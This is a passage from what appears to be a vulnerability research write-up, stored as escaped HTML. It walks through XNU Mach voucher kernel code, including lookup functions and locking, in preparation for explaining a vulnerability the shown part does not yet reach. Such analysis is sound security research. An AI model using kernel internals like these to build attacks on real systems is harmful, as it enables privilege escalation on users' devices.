 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IV_UNUSED_VALINDEX &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;value_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;||&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;count &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_global_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivgte_control&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;IVAC_NULL &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Get the entry and then the linked values.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* TODO: support chained values (for effective vouchers).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;count &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;The locking used in the vouchers code is very important for properly understanding the underlying vulnerability when we eventually get there, but for now I&amp;#39;m glossing over it and we&amp;#39;ll return to examine the relevant locks when necessary.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s discuss the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_lookup_values&lt;/span&gt;&lt;span&gt;&amp;nbsp;code. They index the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_global_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;to get a pointer to the attribute type&amp;#39;s controller:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.93bdc79665655f06bb0a73947fc8e84ad29d789b&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.24&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iv_global_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivgte_control&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;They take that controller&amp;#39;s lock then index its &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;to find that value&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;struct ivac_entry_s&lt;/span&gt;&lt;span&gt;&amp;nbsp;and read the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;value from there:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.dd7ea114ff79be6833293594657c2e978bc73a24&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.25&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;value_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_refs &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivac&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;count &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s go back to the calling function (&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;) and keep reading:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.a0e6fa2961c22bcc59d9cf5d3ac1f7a80569832f&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.26&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* Call out to resource manager to get new value */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_value_voucher &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;IV_NULL&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_get_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)(&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
